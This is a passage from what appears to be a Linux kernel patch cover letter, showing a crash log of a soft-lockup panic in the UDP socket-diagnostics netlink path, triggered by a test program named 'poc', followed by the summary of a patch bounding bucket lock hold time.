[  495.224386][    C3]  ? hlock_class+0x4e/0x130
[  495.224389][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224397][    C3]  ? __pfx____sys_sendmsg (net/socket.c:2654)
[  495.224459][    C3]  ? find_held_lock+0x59/0x110
[  495.224470][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224473][    C3]  ? find_held_lock+0x2d/0x110
[  495.224488][    C3]  __sys_sendmsg (net/socket.c:2802)
[  495.224495][    C3]  ? __pfx___sys_sendmsg (net/socket.c:2780)
[  495.224499][    C3]  ? trace_lock_acquire+0x145/0x1c0
[  495.224526][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.224529][    C3]  ? do_user_addr_fault (arch/x86/include/asm/vsyscall.h:39 arch/x86/mm/fault.c:1131)
[  495.224567][    C3]  do_syscall_64 (arch/x86/entry/syscall_64.c:60 (discriminator 1) arch/x86/entry/syscall_64.c:84 (discriminator 1))
[  495.224592][    C3]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  495.224605][    C3] RIP: 0033:0x7f4c3df06687
[  495.224641][    C3] RSP: 002b:00007ffc0552c810 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[  495.224644][    C3] RAX: ffffffffffffffda RBX: 00007f4c3de74740 RCX: 00007f4c3df06687
[  495.224647][    C3] RDX: 0000000000000000 RSI: 00007ffc0552c8c0 RDI: 000000000001d4c3
[  495.224649][    C3] RBP: 000000000000ea6c R08: 0000000000000000 R09: 0000000000000000
[  495.224651][    C3] R10: 0000000000000000 R11: 0000000000000202 R12: 00005622210c2310
[  495.224653][    C3] R13: 000000000000eab4 R14: 00005622210d0dd0 R15: 00007ffc0552c900
[  495.224701][    C3]  </TASK>
[  495.224717][    C3] Kernel panic - not syncing: softlockup: hung tasks
[  495.260459][    C3] CPU: 3 UID: 1028 PID: 10522 Comm: poc Tainted: G             L     6.12.95 #2
[  495.261054][    C3] Tainted: [L]=SOFTLOCKUP
[  495.261343][    C3] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  495.262146][    C3] Call Trace:
[  495.262389][    C3]  <IRQ>
[  495.262590][    C3]  panic (kernel/panic.c:1096)
[  495.263221][    C3]  ? __show_trace_log_lvl (arch/x86/kernel/dumpstack.c:249 (discriminator 1))
[  495.263616][    C3]  ? __pfx_panic (include/linux/nmi.h:165)
[  495.263957][    C3]  ? add_taint (kernel/panic.c:965)
[  495.264252][    C3]  watchdog_timer_fn (kernel/watchdog.c:951)
[  495.264610][    C3]  ? __pfx_watchdog_timer_fn (kernel/watchdog.c:363)
[  495.264991][    C3]  __hrtimer_run_queues (kernel/time/hrtimer.c:1665)
[  495.265374][    C3]  ? __pfx___hrtimer_run_queues (kernel/time/hrtimer.c:372 (discriminator 1))
[  495.265758][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.266145][    C3]  ? ktime_get_update_offsets_now (kernel/time/timekeeping.c:2873 (discriminator 2))
[  495.266582][    C3]  hrtimer_interrupt (kernel/time/hrtimer.c:785 kernel/time/hrtimer.c:2296)
[  495.266941][    C3]  ? __flush_smp_call_function_queue (include/trace/events/csd.h:64 (discriminator 1) include/trace/events/csd.h:64 (discriminator 1) kernel/smp.c:144 (discriminator 1) kernel/smp.c:632 (discriminator 1))
[  495.267394][    C3]  __sysvec_apic_timer_interrupt (arch/x86/kernel/apic/apic.c:1043)
[  495.267845][    C3]  sysvec_apic_timer_interrupt (arch/x86/kernel/apic/apic.c:2157)
[  495.268231][    C3]  </IRQ>
[  495.268471][    C3]  <TASK>
[  495.268723][    C3]  asm_sysvec_apic_timer_interrupt (arch/x86/include/asm/idtentry.h:674)
[  495.269228][    C3] RIP: 0010:inet_diag_bc_sk (net/ipv4/inet_diag.c:497 net/ipv4/inet_diag.c:631)
[  495.271272][    C3] RSP: 0018:ffffc9001402f378 EFLAGS: 00000297
[  495.271771][    C3] RAX: 0000000000000000 RBX: ffff88802c2630ec RCX: 0000000000000007
[  495.272439][    C3] RDX: 0000000000000004 RSI: ffff888051fe2040 RDI: ffff88802c2630e9
[  495.273092][    C3] RBP: 000000000000b9c8 R08: 0000000000000002 R09: 0000000000000000
[  495.273740][    C3] R10: 00000000000016d2 R11: ffff888051fe2044 R12: dffffc0000000000
[  495.274421][    C3] R13: 0000000000000000 R14: 0000000000002710 R15: 000000000000000b
[  495.275111][    C3]  udp_dump+0x45d/0x6f0
[  495.275485][    C3]  __inet_diag_dump (net/ipv4/inet_diag.c:928)
[  495.275914][    C3]  netlink_dump (net/netlink/af_netlink.c:1922)
[  495.276356][    C3]  ? __pfx_netlink_dump (net/netlink/af_netlink.c:2883)
[  495.276798][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.277277][    C3]  ? ns_capable (kernel/capability.c:339)
[  495.277636][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.278123][    C3]  ? __inet_diag_dump_start (net/ipv4/inet_diag.c:774 net/ipv4/inet_diag.c:862)
[  495.278581][    C3]  __netlink_dump_start (net/netlink/af_netlink.c:967 net/netlink/af_netlink.c:1020)
[  495.279035][    C3]  inet_diag_handler_cmd (net/ipv4/inet_diag.c:806 net/ipv4/inet_diag.c:862)
[  495.279492][    C3]  ? __pfx_inet_diag_handler_cmd (net/ipv4/inet_diag.c:966)
[  495.279985][    C3]  ? __pfx_lock_release+0x10/0x10
[  495.280402][    C3]  ? __pfx_inet_diag_dump_start (net/ipv4/inet_diag.c:891)
[  495.280875][    C3]  ? __pfx_inet_diag_dump (net/ipv4/inet_diag.c:928)
[  495.281299][    C3]  ? __pfx_inet_diag_dump_done (net/ipv4/inet_diag.c:508)
[  495.281771][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.282248][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.282722][    C3]  sock_diag_rcv_msg (net/core/sock_diag.c:131 (discriminator 1) net/core/sock_diag.c:159 (discriminator 1))
[  495.283146][    C3]  netlink_rcv_skb (net/netlink/af_netlink.c:2592)
[  495.283546][    C3]  ? __pfx_sock_diag_rcv_msg (net/core/sock_diag.c:306)
[  495.284010][    C3]  ? __pfx_netlink_rcv_skb (include/linux/skbuff.h:2772 (discriminator 1))
[  495.284449][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.284941][    C3]  ? netlink_deliver_tap+0xcb/0xa80
[  495.285370][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.285845][    C3]  ? netlink_deliver_tap+0x14b/0xa80
[  495.286296][    C3]  netlink_unicast (include/net/scm.h:73 (discriminator 1) include/net/scm.h:98 (discriminator 1) net/netlink/af_netlink.c:1838 (discriminator 1))
[  495.286704][    C3]  ? __pfx_netlink_unicast (net/netlink/af_netlink.c:1255)
[  495.287148][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.287617][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.288089][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.288545][    C3]  ? __check_object_size+0x2eb/0x4f0
[  495.289027][    C3]  netlink_sendmsg (net/netlink/af_netlink.c:2549)
[  495.289431][    C3]  ? __pfx_netlink_sendmsg (net/netlink/af_netlink.c:1361)
[  495.289887][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.290346][    C3]  ? apparmor_socket_sendmsg+0x2e/0x200
[  495.290809][    C3]  ____sys_sendmsg (include/linux/audit.h:496 net/socket.c:257)
[  495.291220][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.291687][    C3]  ? __pfx_____sys_sendmsg (net/socket.c:1151 (discriminator 1))
[  495.292128][    C3]  ? __pfx_copy_msghdr_from_user (net/socket.c:2607)
[  495.292634][    C3]  ___sys_sendmsg (net/socket.c:2965)
[  495.293030][    C3]  ? hlock_class+0x4e/0x130
[  495.293412][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.293880][    C3]  ? __pfx____sys_sendmsg (net/socket.c:2654)
[  495.294368][    C3]  ? find_held_lock+0x59/0x110
[  495.294760][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.295236][    C3]  ? find_held_lock+0x2d/0x110
[  495.295640][    C3]  __sys_sendmsg (net/socket.c:2802)
[  495.296026][    C3]  ? __pfx___sys_sendmsg (net/socket.c:2780)
[  495.296447][    C3]  ? trace_lock_acquire+0x145/0x1c0
[  495.296923][    C3]  ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:234)
[  495.297388][    C3]  ? do_user_addr_fault (arch/x86/include/asm/vsyscall.h:39 arch/x86/mm/fault.c:1131)
[  495.297839][    C3]  do_syscall_64 (arch/x86/entry/syscall_64.c:60 (discriminator 1) arch/x86/entry/syscall_64.c:84 (discriminator 1))
[  495.298227][    C3]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  495.298711][    C3] RIP: 0033:0x7f4c3df06687
[  495.300658][    C3] RSP: 002b:00007ffc0552c810 EFLAGS: 00000202 ORIG_RAX: 000000000000002e
[  495.301343][    C3] RAX: ffffffffffffffda RBX: 00007f4c3de74740 RCX: 00007f4c3df06687
[  495.301992][    C3] RDX: 0000000000000000 RSI: 00007ffc0552c8c0 RDI: 000000000001d4c3
[  495.302658][    C3] RBP: 000000000000ea6c R08: 0000000000000000 R09: 0000000000000000
[  495.303322][    C3] R10: 0000000000000000 R11: 0000000000000202 R12: 00005622210c2310
[  495.303950][    C3] R13: 000000000000eab4 R14: 00005622210d0dd0 R15: 00007ffc0552c900
[  495.304621][    C3]  </TASK>
[  495.305468][    C3] Kernel Offset: disabled
[  495.305829][    C3] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  udp: diag: bound bucket lock hold time

 include/linux/inet_diag.h |   1 +
 net/ipv4/inet_diag.c      |   2 +
 net/ipv4/udp_diag.c       | 154 ++++++++++++++++++++++++++++----------
 3 files changed, 119 insertions(+), 38 deletions(-)

-- 
2.43.0

